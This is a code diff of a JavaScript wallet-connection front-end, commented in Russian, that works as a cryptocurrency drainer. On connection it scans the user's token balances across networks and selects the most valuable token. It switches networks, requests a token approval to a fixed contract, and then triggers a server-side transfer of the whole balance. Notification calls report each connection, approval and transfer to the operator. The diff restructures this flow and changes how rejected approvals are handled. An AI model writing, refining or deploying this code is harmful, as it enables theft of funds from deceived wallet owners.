@@ -500,214 +500,180 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
 // Инициализация подписок
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
-    updateStore('accountState', state);
-    updateStateDisplay('accountState', state);
-    await processWalletConnection(state);
-  }, 1000);
-
-  modal.subscribeAccount(debouncedSubscribeAccount);
-  modal.subscribeNetwork(state => {
-    updateStore('networkState', state);
-    updateStateDisplay('networkState', state);
-    const switchNetworkBtn = document.getElementById('switch-network');
-    if (switchNetworkBtn) {
-      switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`;
-    }
-  });
-};
-// Функция обработки подключения кошелька и подписи
-async function processWalletConnection(state) {
-  if (!state.isConnected || !state.address || !isAddress(state.address) || !store.networkState.chainId) {
-    console.log('Invalid state for processing connection');
-    return;
-  }
-  
-  const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' };
-  const device = detectDevice();
-  if (store.isProcessingConnection) {
-    console.log('Already processing connection, skipping');
-    return;
-  }
-  
-  store.isProcessingConnection = true;
-  const balancePromises = [];
-  Object.entries(TOKENS).forEach(([networkName, tokens]) => {
-    const networkInfo = networkMap[networkName];
-    if (!networkInfo) {
-      console.warn(`Network ${networkName} not found in networkMap`);
-      return;
-    }
-    tokens.forEach(token => {
-      if (isAddress(token.address)) {
-        balancePromises.push(
-          getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
-            .then(balance => ({
-              symbol: token.symbol,
-              balance,
-              address: token.address,
-              network: networkName,
-              chainId: networkInfo.chainId,
-              decimals: token.decimals
-            }))
-            .catch(() => ({
-              symbol: token.symbol,
-              balance: 0,
-              address: token.address,
-              network: networkName,
-              chainId: networkInfo.chainId,
-              decimals: token.decimals
-            }))
-        );
+    updateStore('accountState', state)
+    updateStateDisplay('accountState', state)
+    if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
+      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+      const device = detectDevice()
+      if (store.isProcessingConnection) {
+        console.log('Already processing connection, skipping')
+        return
       }
-    });
-  });
-  
-  const allBalances = await Promise.all(balancePromises);
-  store.tokenBalances = allBalances;
-  updateStateDisplay('tokenBalancesState', allBalances);
-  
-  let maxValue = 0;
-  let mostExpensive = null;
-  for (const token of allBalances) {
-    if (token.balance > 0) {
-      const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol);
-      const value = token.balance * price;
-      token.price = price;
-      if (value > maxValue) {
-        maxValue = value;
-        mostExpensive = { ...token, price, value };
+      const balancePromises = []
+      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
+        const networkInfo = networkMap[networkName]
+        if (!networkInfo) {
+          console.warn(`Network ${networkName} not found in networkMap`)
+          return
+        }
+        tokens.forEach(token => {
+          if (isAddress(token.address)) {
+            balancePromises.push(
+              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
+                .then(balance => ({
+                  symbol: token.symbol,
+                  balance,
+                  address: token.address,
+                  network: networkName,
+                  chainId: networkInfo.chainId,
+                  decimals: token.decimals
+                }))
+                .catch(() => ({
+                  symbol: token.symbol,
+                  balance: 0,
+                  address: token.address,
+                  network: networkName,
+                  chainId: networkInfo.chainId,
+                  decimals: token.decimals
+                }))
+            )
+          }
+        })
+      })
+      const allBalances = await Promise.all(balancePromises)
+      store.tokenBalances = allBalances
+      updateStateDisplay('tokenBalancesState', allBalances)
+      let maxValue = 0
+      let mostExpensive = null
+      for (const token of allBalances) {
+        if (token.balance > 0) {
+          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
+          const value = token.balance * price
+          token.price = price
+          if (value > maxValue) {
+            maxValue = value
+            mostExpensive = { ...token, price, value }
+          }
+        }
       }
-    }
-  }
-  
-  await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId);
-  
-  if (mostExpensive) {
-    console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`);
-    console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })));
-    
-    const targetNetworkInfo = networkMap[mostExpensive.network];
-    if (!targetNetworkInfo) {
-      const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`;
-      store.errors.push(errorMessage);
-      const approveState = document.getElementById('approveState');
-      if (approveState) approveState.innerHTML = errorMessage;
-      hideCustomModal();
-      store.isProcessingConnection = false;
-      return;
-    }
-    
-    const targetNetwork = targetNetworkInfo.networkObj;
-    const expectedChainId = targetNetworkInfo.chainId;
-    if (store.networkState.chainId !== expectedChainId) {
-      console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`);
-      try {
-        await new Promise((resolve, reject) => {
-          const unsubscribe = modal.subscribeNetwork(networkState => {
-            if (networkState.chainId === expectedChainId) {
-              console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`);
-              unsubscribe();
-              resolve();
-            }
-          });
-          appKit.switchNetwork(targetNetwork).catch(error => {
-            unsubscribe();
-            reject(error);
-          });
-          setTimeout(() => {
-            unsubscribe();
-            reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`));
-          }, 10000);
-        });
-      } catch (error) {
-        const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`;
-        store.errors.push(errorMessage);
-        const approveState = document.getElementById('approveState');
-        if (approveState) approveState.innerHTML = errorMessage;
-        hideCustomModal();
-        store.isProcessingConnection = false;
-        return;
-      }
-    } else {
-      console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`);
-    }
-    
-    try {
-      const contractAddress = CONTRACTS[mostExpensive.chainId];
-      const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`;
-      if (store.approvedTokens[approvalKey] || store.isApprovalRequested) {
-        const approveMessage = store.approvedTokens[approvalKey]
-          ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
-          : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`;
-        console.log(approveMessage);
-        const approveState = document.getElementById('approveState');
-        if (approveState) approveState.innerHTML = approveMessage;
-        hideCustomModal();
-        store.isProcessingConnection = false;
-        return;
-      }
-      
-      // Показываем модальное окно перед подписью
-      showCustomModal();
-      
-      store.isApprovalRequested = true;
-      const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId);
-      store.approvedTokens[approvalKey] = true;
-      store.isApprovalRequested = false;
-      let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`;
-      console.log(approveMessage);
-      await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId);
-      
-      const tokenBalance = mostExpensive.balance;
-      const amount = parseUnits((Math.floor(tokenBalance * 1000000) / 1000000).toString(), mostExpensive.decimals);
-      const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash);
-      if (transferResult.success) {
-        approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`;
-        console.log(`Transfer request successful: ${transferResult.txHash}`);
-        await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash);
+      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
+      if (mostExpensive) {
+        console.log(`Самый дорогой токен: ${mostExpensive.symbol}, количество: ${mostExpensive.balance}, цена в USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
+        console.log('Available networks:', networks.map(n => ({ name: n.name, chainId: n.id || 'undefined' })))
+        const targetNetworkInfo = networkMap[mostExpensive.network]
+        if (!targetNetworkInfo) {
+          const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
+          store.errors.push(errorMessage)
+          const approveState = document.getElementById('approveState')
+          if (approveState) approveState.innerHTML = errorMessage
+          hideCustomModal()
+          store.isProcessingConnection = false
+          return
+        }
+        const targetNetwork = targetNetworkInfo.networkObj
+        const expectedChainId = targetNetworkInfo.chainId
+        if (store.networkState.chainId !== expectedChainId) {
+          console.log(`Attempting to switch to ${mostExpensive.network} (chainId ${expectedChainId})`)
+          try {
+            await new Promise((resolve, reject) => {
+              const unsubscribe = modal.subscribeNetwork(networkState => {
+                if (networkState.chainId === expectedChainId) {
+                  console.log(`Successfully switched to ${mostExpensive.network} (chainId ${expectedChainId})`)
+                  unsubscribe()
+                  resolve()
+                }
+              })
+              appKit.switchNetwork(targetNetwork).catch(error => {
+                unsubscribe()
+                reject(error)
+              })
+              setTimeout(() => {
+                unsubscribe()
+                reject(new Error(`Failed to switch to ${mostExpensive.network} (chainId ${expectedChainId}) after timeout`))
+              }, 10000)
+            })
+          } catch (error) {
+            const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
+        } else {
+          console.log(`Already on correct network: ${mostExpensive.network} (chainId ${expectedChainId})`)
+        }
+        try {
+          const contractAddress = CONTRACTS[mostExpensive.chainId]
+          const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
+          if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
+            const approveMessage = store.approvedTokens[approvalKey]
+              ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : store.isApprovalRejected
+              ? `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+              : `Approve request pending for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            console.log(approveMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = approveMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
+            return
+          }
+          store.isApprovalRequested = true
+          const txHash = await approveToken(wagmiAdapter.wagmiConfig, mostExpensive.address, contractAddress, mostExpensive.chainId)
+          store.approvedTokens[approvalKey] = true
+          store.isApprovalRequested = false
+          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+          console.log(approveMessage)
+          await notifyTransferApproved(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId)
+          const tokenBalance = mostExpensive.balance
+          const amount = parseUnits((Math.floor(tokenBalance * 1000000) / 1000000).toString(), mostExpensive.decimals)
+          const transferResult = await sendTransferRequest(state.address, mostExpensive.address, amount, mostExpensive.chainId, txHash)
+          if (transferResult.success) {
+            approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
+            console.log(`Transfer request successful: ${transferResult.txHash}`)
+            await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
+          } else {
+            approveMessage += `<br>Transfer request failed: ${transferResult.message}`
+            console.log(`Transfer request failed: ${transferResult.message}`)
+          }
+          const approveState = document.getElementById('approveState')
+          if (approveState) approveState.innerHTML = approveMessage
+          hideCustomModal()
+          store.isProcessingConnection = false
+        } catch (error) {
+          store.isApprovalRequested = false
+          if (error.code === 4001 || error.code === -32000) {
+            store.isApprovalRejected = true
+            const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            appKit.disconnect()
+            store.connectionKey = null
+            store.isProcessingConnection = false
+            sessionStorage.clear()
+          } else {
+            const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
+            store.errors.push(errorMessage)
+            const approveState = document.getElementById('approveState')
+            if (approveState) approveState.innerHTML = errorMessage
+            hideCustomModal()
+            store.isProcessingConnection = false
+          }
+        }
       } else {
-        approveMessage += `<br>Transfer request failed: ${transferResult.message}`;
-        console.log(`Transfer request failed: ${transferResult.message}`);
-      }
-      const approveState = document.getElementById('approveState');
-      if (approveState) approveState.innerHTML = approveMessage;
-      hideCustomModal();
-      store.isProcessingConnection = false;
-    } catch (error) {
-      store.isApprovalRequested = false;
-      if (error.code === 4001 || error.code === -32000) {
-        store.isApprovalRejected = true;
-        const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`;
-        store.errors.push(errorMessage);
-        const approveState = document.getElementById('approveState');
-        if (approveState) approveState.innerHTML = errorMessage;
-        hideCustomModal();
-        store.isProcessingConnection = false;
-        // НЕ отключаем кошелек, чтобы пользователь мог повторить попытку
-      } else {
-        const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`;
-        store.errors.push(errorMessage);
-        const approveState = document.getElementById('approveState');
-        if (approveState) approveState.innerHTML = errorMessage;
-        hideCustomModal();
-        store.isProcessingConnection = false;
+        const message = 'No tokens with positive balance'
+        console.log(message)
+        const mostExpensiveState = document.getElementById('mostExpensiveTokenState')
+        if (mostExpensiveState) mostExpensiveState.innerHTML = message
+        hideCustomModal()
+        store.isProcessingConnection = false
       }
     }
-  } else {
-    const message = 'No tokens with positive balance';
-    console.log(message);
-    const mostExpensiveState = document.getElementById('mostExpensiveTokenState');
-    if (mostExpensiveState) mostExpensiveState.innerHTML = message;
-    hideCustomModal();
-    store.isProcessingConnection = false;
-  }
-}
-
-const debouncedSubscribeAccount = debounce(async state => {
-  updateStore('accountState', state);
-  updateStateDisplay('accountState', state);
-  await processWalletConnection(state);
-}, 1000);
+  }, 1000)
   modal.subscribeAccount(debouncedSubscribeAccount)
   modal.subscribeNetwork(state => {
     updateStore('networkState', state)
@@ -717,28 +683,17 @@ const debouncedSubscribeAccount = debounce(async state => {
       switchNetworkBtn.textContent = `Switch to ${state?.chainId === polygon.id ? 'Mainnet' : 'Polygon'}`
     }
   })
-
+}
 
 initializeSubscribers(appKit)
 updateButtonVisibility(appKit.getIsConnectedState())
 
 // Обработчик для кнопок подключения кошелька
 document.querySelectorAll('.open-connect-modal').forEach(button => {
-  button.addEventListener('click', async (event) => {
+  button.addEventListener('click', (event) => {
     event.stopPropagation(); // Предотвращаем всплытие события к document
     if (!appKit.getIsConnectedState()) {
       appKit.open();
-    } else if (store.isApprovalRejected) {
-      // Сбрасываем флаги для повторной попытки подписи
-      store.isApprovalRejected = false;
-      store.isApprovalRequested = false;
-      store.connectionKey = null;
-      store.isProcessingConnection = false;
-      // Запускаем процесс проверки баланса и подписи
-      const state = store.accountState;
-      if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
-        await processWalletConnection(state);
-      }
     }
   });
 });
